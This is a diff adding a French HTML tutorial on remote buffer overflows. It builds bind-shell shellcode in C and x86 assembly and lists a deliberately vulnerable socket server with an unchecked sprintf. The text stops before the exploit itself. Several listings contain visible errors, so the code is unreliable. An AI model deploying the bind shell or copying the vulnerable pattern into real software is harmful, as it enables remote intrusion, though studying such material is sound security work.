@@ -1,0 +1,918 @@
+<html>
+<head>
+<title>Writing remote BOF</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link href="style.css" rel="stylesheet" type="text/css">
+<link href="style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div align="center">
+  <hr>
+  <p><img src="Images/Writing%20remote%20BOF.jpg" width="469" height="60"></p>
+  <hr>
+  <p align="LEFT"><em><font face="Verdana, Arial, Helvetica, sans-serif" size="1"><a href="rbof.htm" target="_blank">AFFICHER 
+CET ARTICLE EN MODE PAGE ENTIERE</a></font></em></p><p align="center"><font size="3"><strong><u>SOMMAIRE</u></strong></font></p>
+  <p align="left">&nbsp; </p>
+  <p align="left"><font size="2"><a href="#1">1) Introduction<br>
+    </a><br>
+    <a href="#2">2) Rappel sur les buffers overflows</a></font></p>
+  <p align="left"><font size="2"> <a href="#3">3) Remote buffer overflow : th&eacute;orie</a></font></p>
+  <p align="left"><font size="2"> <a href="#4">4) Ecriture d'un shellcode '<em>bindshell</em>'</a></font></p>
+  <p align="left"><font size="2"> <a href="#5">5) Remote buffer overflow: exemple</a></font></p>
+  <p align="left"><font size="2"> <a href="#6">6) Conclusion</a></font></p>
+  <p align="left"><font size="2"> <a href="#7">7) R&eacute;ferences</a></font></p>
+  <hr>
+  <p align="left"><br>
+    <font size="2"><strong><u><br>
+    <a name="1"></a>1) Introduction</u></strong></font></p>
+  <p align="left"> <font size="4">A</font><font size="2">leph1 <font color="#FF0000">[1]</font> 
+    avec son article intitul&eacute; 'Smash the stack for fun and profit' a r&eacute;volutionn&eacute; 
+    le principe des buffer overflows. Cette technique d'exploitation est surement 
+    l'une des plus r&eacute;pandues et, malgr&eacute; toutes les protections actuelles, 
+    l'une des plus exploit&eacute;es au monde. Les applications touch&eacute;es 
+    par ce type de faille peuvent &ecirc;tre de simples programme mais aussi des 
+    programmes tournants en permanence sur la machine h&ocirc;te et attendant 
+    une connexion provenant de l'ext&eacute;rieur, ces programmes sont connus 
+    sous le nom de d&eacute;mon (<em>daemon</em>). Nous verrons dans cet article 
+    qu'il est possible d'exploiter ces programmes de l'ext&eacute;rieur. Des bases 
+    en C et Assembleur sont requises si vous voulez comprendre la suite de l'article. 
+    </font></p>
+  <p align="left">&nbsp;</p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><strong><u><font size="2"><a name="2"></a>2) Rappel sur les 
+    buffers overflows</font></u></strong></p>
+  <p align="left"> <font size="4">U</font><font size="2">n buffer overflow, ou 
+    d&eacute;passement de tampon est le fait d'entrer plus de donn&eacute;es qu'il 
+    n'est permis dans un espace m&eacute;moire (<em>buffer</em>). Le but d'une 
+    exploitation de buffer overflow est de faire ex&eacute;cuter du code arbitraire 
+    &agrave; un programme. Le code arbitraire sera execut&eacute; avec les droits 
+    du<br>
+    propri&eacute;taire et a souvent pour r&ocirc;le de donner un shell, il est 
+    alors appel&eacute; 'shellcode'. Lors d'une attaque par buffer overflow, l'exploit 
+    ne contient pas seulement le shellcode proprement dit. Il se compose en 3 
+    morceaux principaux, en g&eacute;n&eacute;ral :<br><br>
+    - des <em><strong>NOP</strong></em><br>
+    - le <em><strong>shellcode</strong></em><br>
+    - l'adresse de retour qui renvoit vers les<strong> <em>NOP</em></strong><em>s</em>.<br>
+    <br>
+    Le but de cet article &eacute;tant d'exploiter en remote un buffer overflow 
+    et non pas de comprendre le principe des buffers overflows, je m'arr&egrave;te 
+    l&agrave; mais si vous voulez plus d'informations sur le sujet reportez vous 
+    &agrave; <font color="#FF0000">[1]</font> et <font color="#FF0000">[2]</font>.</font></p>
+  <p align="left">&nbsp;</p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="2"><strong><u><a name="3"></a>3) Remote buffer overflow: 
+    th&eacute;orie</u></strong></font></p>
+  <p align="left"> <font size="4">L</font><font size="2">'exploitation du '<em>Remote 
+    buffer overflow</em>' est pratiquement identique &agrave; l'exploitation dite 
+    locale. En effet, c'est toujours la m&ecirc;me routine, on recherche l'adresse 
+    o&ugrave; l'on va devoir retourner c'est &agrave; dire l'adresse du <em>buffer</em> 
+    (<font color="#666666" face="Courier New, Courier, mono">%esp</font>, le registre 
+    qui pointe en haut de la pile). Pour des 'gros' <em>buffers</em>, cette adresse 
+    peut &ecirc;tre d&eacute;termin&eacute;e approximativement puisque l'on remplira 
+    le buffer de <em><strong>NOP</strong></em> ( <em><strong>N</strong>O <strong>OP</strong>ERATION</em> 
+    ). Il faut aussi d&eacute;terminer la taille du <em>buffer</em> pour que l'exploit 
+    puisse '<em>overwritter</em>' l'adresse de retour (<font color="#666666" face="Courier New, Courier, mono">%eip</font>, 
+    '<em><font color="#666666">e</font>xtended <font color="#666666">i</font>nstruction 
+    <font color="#666666">p</font>ointer</em>' le registre qui pointe vers la 
+    prochaine instruction). La diff&eacute;rence avec les exploits locaux, c'est 
+    qu'il faut utiliser les <em>sockets</em> pour pouvoir envoyer le <em>buffer</em> 
+    au server distant. Le <em>shellcode</em> est &eacute;galement diff&eacute;rent 
+    puisque l'on a pas d'acc&egrave;s direct sur la machine distante, il faudra 
+    donc le plus souvent un <em>shellcode</em> qui nous '<em>bind</em>' un <em>shell</em> 
+    sur un port pr&eacute;cis.</font></p>
+  <p align="left">&nbsp;</p>
+  <p align="left">&nbsp;</p>
+  <p align="left"> <a name="4"></a><font size="2"><strong><u>4) Ecriture d'un 
+    shellcode 'bindshell'</u></strong></font></p>
+  <p align="left"><br>
+    <font size="4">L</font><font size="2">a conception du shellcode est sans doute 
+    la chose la plus dur dans l'exploitation d'un buffer overflow, heureusement 
+    pour nous des shellcodes de toutes sortes sont pr&eacute;sents sur la toile 
+    mais voyons quand meme comment r&eacute;alise-t-on un shellcode dans les grandes 
+    lignes. Si cela ne vous suffit pas vous pouvez toujours aller jetter un coup 
+    d'oeil sur l'article de <font face="Lucida Console"><a href="mailto:">NOCTE 
+    </a></font> sur la conception avanc&eacute;e de <em>shellcodes</em> <font color="#FF0000">[3]</font>.</font></p>
+  <p align="left"><font size="2"><em><u>On veut un shellcode qui :</u></em><br>
+    <br>
+    -<em> bind</em> un <em>shell</em> sur le port <font color="#006600">1280</font>.<br>
+    - ne contient pas de <em>null byte</em> (<font color="#666666" face="Courier New, Courier, mono">0x00</font>).<br>
+    - soit de la taille la plus petite possible.</font></p>
+  <p align="left"><font size="2">Ici deux possibilt&eacute;s s'offrent &agrave; 
+    nous, soit on &eacute;crit le code en C, on le d&eacute;sassemble, on le modifie 
+    et hop!<br>
+    </font></p>
+  <p align="left"><font size="2"><em><u>Exemple de code possible, il bind un shell 
+    (<font color="#666666" face="Courier New, Courier, mono">/bin/sh</font>) sur 
+    le port <font color="#006600">1280</font>:</u></em></font></p>
+  <table width="28%" height="358" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><p><font color="#666666" size="2" face="Courier New, Courier, mono">[...]<br>
+          main()<br>
+          {<br>
+          int fd,dup;<br>
+          struct sockaddr_in yeah;</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> fd=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);<br>
+          yeah.sin_family=AF_INET;<br>
+          yeah.sin_addr.s_addr=INADDR_ANY;<br>
+          yeah.sin_port=htons(1280);</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> 
+          bind(fd,(struct sockaddr *)&amp;sin,sizeof(yeah));<br>
+          listen(fd,1);<br>
+          dup=accept(fd,0,0);<br>
+          dup2(dup,0);<br>
+          dup2(dup,1);<br>
+          dup2(dup,2);<br>
+          execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);<br>
+          }</font></p>
+        </td>
+    </tr>
+  </table>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="4">O</font><font size="2">u soit on le fait directement 
+    en assembleur. Pour cela on fait une liste des <em>syscalls</em> (appels syst&egrave;me) 
+    que l'on utilisera pour <em>binder</em> le <em>shell</em>. Ici nous utiliserons: 
+    <font color="#666666" face="Courier New, Courier, mono">SYS_socketcall</font> 
+    qui va tout gerer au niveau de la connexion (<em>connect, bind, listen, accept</em> 
+    ...), <font color="#666666" face="Courier New, Courier, mono">SYS_dup2, SYS_execve</font> 
+    et <font color="#666666" face="Courier New, Courier, mono">SYS_exit</font>. 
+    On regarde dans <font color="#666666" face="Courier New, Courier, mono">asm/unistd.h</font> 
+    et <font color="#666666" face="Courier New, Courier, mono">linux/net.h</font> 
+    (pour <font color="#666666" face="Courier New, Courier, mono">SYS_socket</font>) 
+    pour avoir plus d'infos sur ces <em>syscalls</em>. On sait alors que:</font></p>
+  <p align="left"><font size="2"><u><em>execve :</em></u></font></p>
+  <table width="12%" border="1" align="left" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF">
+<div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">%eax 
+          : 0x1b</font></div></td>
+    </tr>
+  </table>
+  <p align="left"><br><br>
+  </p>
+  <p align="left"><font size="2"><em><u><br>dup2 :</u></em></font></p>
+  <table width="12%" border="1" align="left" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF">
+<div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">%eax 
+          : 0x3f</font></div></td>
+    </tr>
+  </table>
+  <p align="left"><br><br>
+  </p>
+  <p align="left"><em><u><font size="2"><br>socketcall :</font></u></em></p>
+  <table width="12%" border="1" align="left" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF">
+<div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">%eax 
+          : 0x66</font></div></td>
+    </tr>
+  </table>
+  <p align="left"><br><br>
+  </p>
+  <p align="left"><font size="4"><br>C</font><font size="2">e <em>syscall</em> permet 
+    de r&eacute;aliser toutes les op&eacute;rations li&eacute;es avec les <em>sockets</em> 
+    c'est &agrave; dire que les fonctions telles que <font color="#666666" face="Courier New, Courier, mono">connect</font>, 
+    <font color="#666666" face="Courier New, Courier, mono">listen</font>, <font color="#666666" face="Courier New, Courier, mono">bind</font> 
+    sont r&eacute;alis&eacute;es &agrave; partir de ce <em>syscall</em>. Ces fonctions 
+    sont appel&eacute;es &agrave; l'aide du registre <font color="#666666" face="Courier New, Courier, mono">%ebx</font>. 
+    On peut trouver les num&eacute;ros de ces fonctions dans <font color="#666666" face="Courier New, Courier, mono">linux/net.h</font>. 
+    Ainsi on a:</font></p>
+  <table width="19%" height="73" border="1" align="left" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"> 
+        <div align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">socket() : %ebx 
+          = 0x1<br>
+          bind() : %ebx = 0x2<br>
+          connect() : %ebx = 0x3<br>
+          listen() : %ebx = 0x4<br>
+          accept() : %ebx = 0x5</font></div></td>
+    </tr>
+  </table>
+  <p align="left"><font size="2"></font></p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><br><br><br><br><br><br><font size="2"><em><u><br>
+    exit:</u></em></font></p>
+  <table width="12%" border="1" align="left" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF">
+<div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">%eax 
+          : 0x1</font></div></td>
+    </tr>
+  </table>
+  <p align="left"><br>
+  </p>
+  <p align="left"></p>
+  <p align="left"><font size="2"><em><u><br><br><br>Un petit rappel sur les instructions asm 
+    importantes pour &eacute;crire un shellcode :</u></em></font></p>
+  <p align="left"><font size="2"> - <font color="#FF0000">CALL</font> : l'instruction 
+    <font color="#666666" face="Courier New, Courier, mono">CALL</font> permet d'appeler une sous-routine.<br>
+    - <font color="#FF0000">JMP</font> : l'instruction <font color="#666666" face="Courier New, Courier, mono">JMP</font> 
+    effectue un saut vers une autre partie du programme.<br>
+    - <font color="#FF0000">MOV</font> : l'instruction <font color="#666666" face="Courier New, Courier, mono">MOV</font> 
+    sert &agrave; placer une valeur dans un registre.<br>
+    - <font color="#FF0000">XOR</font> : ou exclusif, dans les shellcodes elle 
+    sert &agrave; mettre un registre &agrave; 0, ainsi apr&egrave;s un <font color="#666666" face="Courier New, Courier, mono">xor 
+    %eax</font>,<font color="#666666" face="Courier New, Courier, mono">%eax <font color="#000000" face="Verdana, Arial, Helvetica, sans-serif">ou</font> 
+    %eax=0</font>. Cette 'technique' permet d'&eacute;viter l'utilisation d'<em>opcode 
+    null</em> (<font color="#666666" face="Courier New, Courier, mono">0x00</font>).<br>
+    -<font color="#FF0000"> PUSH</font> : l'instruction <font color="#666666" face="Courier New, Courier, mono">PUSH</font> 
+    permet de placer une valeur sur la pile.<br>
+    - <font color="#FF0000">POP</font> : l'instruction <font color="#666666" face="Courier New, Courier, mono">POP</font> 
+    permet de r&eacute;cup&eacute;rer une valeur pos&eacute;e sur la pile.<br>
+    - <font color="#FF0000">LEAL</font> : Charge une adresse m&eacute;moire dans 
+    un registre.<br>
+    - <font color="#FF0000">INC</font> : Incr&eacute;mente (<font color="#666666" face="Courier New, Courier, mono">i++</font>)</font></p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="2"><em><u>Un petit rappel sur les registres les 
+    plus 'importants' :</u></em></font></p>
+  <p align="left"><font size="2"> - <font color="#FF0000">EAX</font> : registre 
+    accumulateur.<br>
+    - <font color="#FF0000">EBX</font> : registre de base.<br>
+    - <font color="#FF0000">ECX </font>: second registre de base (<em>compteur</em>).<br>
+    - <font color="#FF0000">EDX</font> : troisi&egrave;me registre de base (<em>donn&eacute;e</em>).<br>
+    - <font color="#FF0000">EIP</font> : pointeur d'instruction.<br>
+    - <font color="#FF0000">ESP</font> : registre qui pointe en haut de la pile.<br>
+    - <font color="#FF0000">EBP</font> : pointeur de base de la pile.<br>
+    <br>
+    </font></p>
+  <p align="left"><font size="4">P</font><font size="2">our ce genre de shellcode, 
+    je pr&eacute;f&egrave;re prendre la source en C, l'a d&eacute;sassembler pour 
+    voir et l'a modifier apr&egrave;s. Allons-y:</font></p>
+  <p align="left"><font color="#000000" size="2"><em><u>Je compile le code ci-dessous:</u></em></font></p>
+  <table width="36%" border="1" bordercolor="#000000">
+    <tr> 
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~$ 
+          gcc -static shell.c -o shell</font></div></td>
+    </tr>
+  </table>
+  <p align="left"><br>
+    <u><em><font size="2">Je le test :</font></em></u></p>
+  <table width="36%" border="1" bordercolor="#000000">
+    <tr> 
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~$ 
+        ./shell &amp;<br>
+        viriiz@null:~$ netstat -an | grep 'LISTEN'<br>
+        tcp 0 0.0.0.0:1280 0.0.0.0:* LISTEN<br>
+        viriiz@null:~$ telnet 127.0.0.1 1280<br>
+        Trying 127.0.0.1...<br>
+        Connected to localhost.<br>
+        Escape character is '^]'.<br>
+        echo ca marche;<br>
+        ca marche</font></td>
+    </tr>
+  </table>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="4">C</font><font size="2">'est bon ca marche, on 
+    peut maintenant la desassembler. On desassemble petit &agrave; petit pour 
+    chaque &eacute;tape, c'est &agrave; dire on desassemble d'abord <em>socket</em>, 
+    puis <em>connect</em>, puis <em>listen</em> et ainsi de suite pour arriver 
+    jusqu'au <em>execve</em> ( <em>exit</em> on sait le faire sans desassembler 
+    hein ? ;] ).</font></p>
+  <table width="45%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~$ 
+        gdb shell -q<br>
+        (gdb) disassemble main<br>
+        Dump of assembler code for function socket:<br>
+        [...]<br>
+        0x80481e3 &lt;main+19&gt;: push $0x0<br>
+        0x80481e5 &lt;main+21&gt;: push $0x1<br>
+        0x80481e7 &lt;main+23&gt;: push $0x2<br>
+        0x80481e9 &lt;main+25&gt;: call 0x804e950 &lt;socket&gt;<br>
+        End of assembler dump.<br>
+        (gdb) disassemble socket<br>
+        0x804e950 &lt;socket&gt;: mov %ebx,%edx<br>
+        0x804e952 &lt;socket+2&gt;: mov $0x66,%eax<br>
+        0x804e957 &lt;socket+7&gt;: mov $0x1,%ebx<br>
+        0x804e95c &lt;socket+12&gt;: lea 0x4(%esp,1),%ecx<br>
+        0x804e960 &lt;socket+16&gt;: int $0x80<br>
+        0x804e962 &lt;socket+18&gt;: mov %edx,%ebx<br>
+        0x804e964 &lt;socket+20&gt;: cmp $0xffffff83,%eax<br>
+        0x804e967 &lt;socket+23&gt;: jae 0x8050460 &lt;__syscall_error&gt;</font></td>
+    </tr>
+  </table>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="4">O</font><font size="2">n remarque ici que &agrave; 
+    '<font color="#666666" face="Courier New, Courier, mono">&lt;socket+2&gt; 
+    mov $0x66,%eax</font>' 66 correspond au syscall socket (<font color="#666666" face="Courier New, Courier, mono">66h=102d</font>), 
+    on peut remplacer '<font color="#666666" face="Courier New, Courier, mono">mov 
+    $0x66,%eax</font>' par '<font color="#666666" face="Courier New, Courier, mono">mov 
+    $102, %eax</font>' si on a pas l'habitude de l'hexad&eacute;cimal. On remarque 
+    &eacute;galement que &agrave; '<font color="#666666" face="Courier New, Courier, mono">&lt;socket+7&gt; 
+    mov $0x1,%ebx</font>' 1 correspond &agrave; la fonction<br>
+    <font color="#666666" face="Courier New, Courier, mono">socket()</font>. C'est 
+    bon <font face="Verdana, Arial, Helvetica, sans-serif"><strong>gdb</strong></font> 
+    nous raconte pas n'importe quoi . On a alors a peu pr&egrave;s le code asm 
+    de la fonction <font color="#666666" face="Courier New, Courier, mono">socket(AF_INET,SOCK_STREAM,IPPROTO_IP)</font>; 
+    </font><font size="2">On le modifie pour supprimer les <font color="#666666" face="Courier New, Courier, mono">x00</font> 
+    avec quelques astuces (en jouant avec les 'petits registres'<br>
+    8/16 bits ...) et on obtient &ccedil;a :</font></p>
+  <table width="59%" border="1" bordercolor="#000000">
+    <tr> 
+      <td height="304" bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">xorl 
+        %eax,%eax # on met les registres &agrave; 0<br>
+        xorl %ebx,%ebx<br>
+        xorl %ecx,%ecx<br>
+        xorl %edx,%edx<br>
+        movb $0x66,%al # 66h = 102d = socket<br>
+        movb $0x1,%bl # socket()<br>
+        pushl %ecx <br>
+        movb $0x6,%cl # on place les 3 arguments AF_INET SOCK_STREAM IPPROTO_IP 
+        <br>
+        <br>
+        pushl %ecx<br>
+        movb $0x1,%cl<br>
+        pushl %ecx<br>
+        movb $0x2,%cl<br>
+        pushl %ecx<br>
+        leal (%esp),%ecx<br>
+        int $0x80</font></td>
+    </tr>
+  </table>
+  <p align="left"><font size="2"></font></p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="2"><em><u>On fait pareil pour les autres appels 
+    (listen, connect, accept), on fait quelques modifications et on obtient au 
+    final le code suivant :</u></em></font></p>
+  <table width="49%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"> 
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">#socket(AF_INET,SOCK_STREAM,IPPROTO_IP);<br>
+          xorl %eax,%eax # 'pr&eacute;lude on met les registres &agrave; 0'<br>
+          xorl %ebx,%ebx<br>
+          xorl %ecx,%ecx<br>
+          xorl %edx,%edx<br>
+          movb $0x66,%al # 66h = 102d = socketcall<br>
+          movb $0x1,%bl # on &eacute;crit les 3 arguments<br>
+          pushl %ecx<br>
+          movb $0x6,%cl # IP_PROTO<br>
+          pushl %ecx<br>
+          movb $0x1,%cl # SOCK_STREAM<br>
+          pushl %ecx<br>
+          movb $0x2,%cl # AF_INTET<br>
+          pushl %ecx<br>
+          leal (%esp),%ecx # adresse des args dans ecx<br>
+          int $0x80 # on passe tout &ccedil;a au kernel</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"><br>
+          # bind(fd,(struct sockaddr *)&amp;yeah,sizeof(yeah));<br>
+          movb $0x2,%bl # SYS_bind<br>
+          movb $0x2,%cl # INADDR_ANY<br>
+          xorl %ecx,%ecx <br>
+          pushl %ecx<br>
+          pushl %ecx<br>
+          pushl %ecx<br>
+          addb $0x04,%cl # htons(1280)<br>
+          pushl %cx<br>
+          movb $0x2,%cl # AF_INET<br>
+          pushw %cx<br>
+          leal (%esp),%ecx<br>
+          movb $0x10,%dl # sizeof(yeah) = 16d = 10h<br>
+          pushl %edx<br>
+          pushl %ecx<br>
+          pushl %eax<br>
+          leal (%esp),%ecx # adresse des args dans ecx<br>
+          movl %eax,%edx<br>
+          xorl %eax,%eax<br>
+          movb $0x66,%al # socketcall<br>
+          int $0x80 # kernel</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> # listen(fd,0);<br>
+          movb $0x1,%bl <br>
+          pushl %ebx <br>
+          pushl %edx<br>
+          leal (%esp),%ecx # adresse des args dans ecx<br>
+          xorl %eax,%eax # on met eax a 0<br>
+          movb $0x66,%al # socketcall<br>
+          addb $0x3,%bl # SYS_listen<br>
+          int $0x80 # kernel</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> # accept(fd,struct 
+          sockaddr,16);<br>
+          xorl %eax,%eax # on met eax &agrave; 0 et on &eacute;crits les arguments<br>
+          pushl %eax<br>
+          pushl %eax<br>
+          pushl %edx <br>
+          leal (%esp),%ecx # adresse des args dans ecx<br>
+          movl $0x5,%bl # SYS_accept<br>
+          movl $0x66,%al # socketcall<br>
+          int $0x80 # kernel</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> # dup2(dup,0)<br>
+          movl %eax,%eb # sauvegarde<br>
+          xorl %ecx,%ecx # on met eax &agrave; 0<br>
+          xorl %eax,%eax # on met eax &agrave; 0<br>
+          movb $0x3f,%al # dup2<br>
+          int $0x80 # kernel</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> # dup2(dup,1)<br>
+          inc %ecx # on incr&eacute;mente ecx ( i++ )<br>
+          xorl %eax,%eax # on met eax &agrave; 0<br>
+          movl $0x3f,%al # dup2<br>
+          int $0x80 # kernel</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> # dup2(dup,2)<br>
+          inc %ecx # on incr&eacute;mente ecx ( i++ )<br>
+          xorl %eax,%eax # on met eax &agrave; 0<br>
+          movb $0x3f,%al # dup2<br>
+          int $0x80 # kernel</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> # execve(/bin/sh,0);<br>
+          jmp 0x18 # on jump en bas <br>
+          popl %esi # on recup l'addr de de /bin/sh<br>
+          movl %esi,0x8(%ebp) # on l'&eacute;crit au d&eacute;but de la table<br>
+          xorl %eax,%eax # on &eacute;crit NULL apr&egrave;s<br>
+          movb %eax,0x7(%esi)<br>
+          movl %eax,0xc(%ebp) # on place le caract&egrave;re null &agrave; la 
+          fin<br>
+          movb $0xb,%al # b = 11 = execve()<br>
+          movl %esi,%ebx # on place esi dans ebx<br>
+          leal 0x8(%ebp),%ecx # on mets les arguments dans ecx <br>
+          leal 0xc(%ebp),%edx # on mets l'environnement dans edx<br>
+          int $0x80 # on balance au kernel<br>
+          call -0x1d # on remonte en haut <br>
+          .string &quot;/bin/sh&quot;</font></p>
+  </td>
+    </tr>
+  </table>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="4">L</font><font size="2">e shellcode fait une longeur 
+    de 156 bytes et n'est vraiment pas du tout optimis&eacute; (mais compr&eacute;hensible), 
+    sachant que le plus petit <em>bindshell</em> pour <em>x86</em> fait environ 
+    85 bytes, c'est pas terrible mais on va faire avec.</font> </p>
+  <p align="left"><font size="2"><em><u>Je compile le code ci-dessus :</u></em></font></p>
+  <table width="49%" border="1" bordercolor="#000000">
+    <tr> 
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~$ 
+        as shell.s -o shell.o ; ld shell.o -o shell</font></td>
+    </tr>
+  </table>
+  <p align="left"><u><em><font size="2">Je le test :</font></em></u></p>
+  <table width="60%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~$ 
+        ./shell &amp;<br>
+        viriiz@null:~$ netstat -an | grep 'LISTEN'<br>
+        tcp 0 0.0.0.0:1280 0.0.0.0:* LISTEN<br>
+        viriiz@null:~$ telnet 127.0.0.1 1280<br>
+        Trying 127.0.0.1...<br>
+        Connected to localhost.<br>
+        Escape character is '^]'.<br>
+        echo ca marche;<br>
+        ca marche</font></td>
+    </tr>
+  </table>
+  <p align="center"><u><font size="2"></font></u></p>
+  <p align="left"><br>
+    <font size="4">C</font>'<font size="2">est bon ca marche . On peut passer 
+    &agrave; l'exploitation avec un exemple...</font></p>
+  <p align="left"><font size="2"><u>PS</u> : Pour ceux qui ont pas tout compris, 
+    reportez vous &agrave; <font color="#FF0000">[3]</font>.</font></p>
+  <p align="left"><br>
+  </p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="2"><strong><u><a name="5"></a>5) Remote buffer overflow: 
+    exemple</u></strong></font></p>
+  <p align="left"> <font size="2">Apr&egrave;s la th&eacute;orie et la cr&eacute;ation 
+    du shellcode, il est temps de faire un petit exemple. On va donc programmer 
+    un 'mini server' vuln&eacute;rable &agrave; un buffer overflow. Ce 'mini server' 
+    tourne en permanence sur le port <font color="#006600">4000</font>. D&egrave;s 
+    que qu'une personne se connect dessus, il demande son login puis affiche un 
+    message de bienvenue du genre 'Bonjour login, bienvenue sur mon server'. Le 
+    probl&egrave;me est qu'il n'y a pas de v&eacute;rification sur la taille du 
+    login. Voici la source:</font></p>
+  <table width="75%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"> 
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">#include 
+          &lt;stdio.h&gt;<br>
+          #include &lt;netdb.h&gt;<br>
+          #include &lt;netinet/in.h&gt;<br>
+          #define BUFFER_SIZE 500<br>
+          #define NAME_SIZE 1000</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"><br>
+          int sendstring(int c)<br>
+          {<br>
+          char buffer[BUFFER_SIZE], name[NAME_SIZE];<br>
+          int sendrecv;<br>
+          strcpy(buffer, &quot;login: &quot;;<br>
+          sendrecv = send(c, buffer, strlen(buffer), 0);<br>
+          /* normalement on test si les envoies et les r&eacute;ceptions ont &eacute;t&eacute; 
+          correctement effectu&eacute;s */<br>
+          sendrecv = recv(c, name, sizeof(name), 0);<br>
+          name[sendrecv - 1] = '\0';<br>
+          sprintf(buffer, &quot;\nHello %s ! Welcome to my server !\r\n&quot;, 
+          name); /* OMFG */<br>
+          send(c, buffer, strlen(buffer), 0);<br>
+          return 0;<br>
+          }</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">int main(int argc, 
+          char *argv[])<br>
+          {<br>
+          int s, c, cli_size;<br>
+          struct sockaddr_in yeah, cli;<br>
+          /* normalement dans un vrai server on fait des tests si les fonctions 
+          ont r&eacute;ussis ou non */<br>
+          s = socket(AF_INET, SOCK_STREAM, 0);<br>
+          yeah.sin_addr.s_addr = INADDR_ANY;<br>
+          yeah.sin_port = htons(4000);<br>
+          yeah.sin_family = AF_INET;<br>
+          bind(s, &amp;yeah, sizeof(yeah));<br>
+          listen(s, 3);<br>
+          while(1)<br>
+          {<br>
+          c = accept(s, &amp;cli, &amp;cli_size);<br>
+          sendstring(c);<br>
+          close(c);<br>
+          }<br>
+          return 0;<br>
+          }<br>
+          </font></p>
+  </td>
+    </tr>
+  </table>
+  <p align="left"><font size="2"></font></p>
+  <p align="left"><font size="4">J</font><font size="2">e n'ai</font><font size="2"> 
+    pas comment&eacute; le code, je pense qu'il est assez simple &agrave; comprendre 
+    si vous ne comprennez pas allez jetter un coup d'oeil sur la programmtion 
+    de <em>socket</em> en C. Le probl&egrave;me se situe &agrave; la ligne 20 
+    '<font color="#666666" face="Courier New, Courier, mono">sprintf(buffer, &quot;\nHello 
+    %s ! Welcome to my server !\r\n&quot;, name);</font>', on copie la chaine 
+    <font color="#666666" face="Courier New, Courier, mono">'Hello 'name' ! Welcome 
+    to my server !</font>' dans le <em>buffer</em> sans aucune v&eacute;rification 
+    de taille.</font></p>
+  <p align="left"><font size="2"><em><u>On va maintenant faire nos tests :</u></em></font></p>
+  <table width="44%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"> 
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+          gcc -o vuln vuln.c<br>
+          viriiz@null:~/RemoteBOF$ ./vuln &amp;<br>
+          viriiz@null:~/RemoteBOF$ netstat -an | grep 'LISTEN'<br>
+          tcp 0 0 0.0.0.0:4000 0.0.0.0:* LISTEN<br>
+          viriiz@null:~/RemoteBOF$ telnet 127.0.0.1 4000<br>
+          Trying 127.0.0.1...<br>
+          Connected to 127.0.0.1.<br>
+          Escape character is '^]'.<br>
+          login: viriiz</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> ! Welcome to 
+          my server !<br>
+          Connection closed by foreign host.</font></p>
+  </td>
+    </tr>
+  </table>
